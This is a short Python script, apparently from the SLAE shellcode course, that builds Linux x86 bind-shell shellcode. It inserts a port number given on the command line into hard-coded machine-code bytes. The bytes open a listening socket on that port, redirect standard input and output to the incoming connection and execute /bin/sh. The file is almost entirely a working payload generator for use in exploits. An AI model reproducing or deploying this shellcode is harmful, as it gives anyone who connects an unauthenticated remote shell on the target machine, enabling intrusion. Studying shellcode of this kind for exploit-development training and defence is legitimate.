########################################
# Filename: Bind-Shell-Creator.py
# Author  : Andrea Perfetti
# SLAE ID : SLAE - 1547
#:::::::::::::::::::::::::::::::::::::::
# USAGE
# Invoke the script adding port number as argument
########################################

import socket
import sys

shellcode_part1 = '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x89\\xe2\\x50\\x50\\x50\\x66\\x68'
shellcode_part2 = '\\x66\\x6a\\x02\\x66\\xb8\\x69\\x01\\x89\\xfb\\x89\\xe1\\x29\\xca\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\xcd\\x80\\x89\\xc6\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x31\\xdb\\x40\\xcd\\x80'



if len(sys.argv) < 2:
    print ('Usage: python3 {utility} [port_to_bind]'.format(utility = sys.argv[0]))
    exit(1)

port = int(sys.argv[1])
port = hex(socket.htons(port))

port_string = '\\x{b1}\\x{b2}'.format(b1 = port[4:6], b2 = port[2:4])

shellcode = shellcode_part1 + port_string + shellcode_part2

print ('Actual Port: {p}'.format(p=port))
print ('Port for the shellcode: {p}'.format(p=port_string))
print ("\nShellcode:")
print (shellcode)
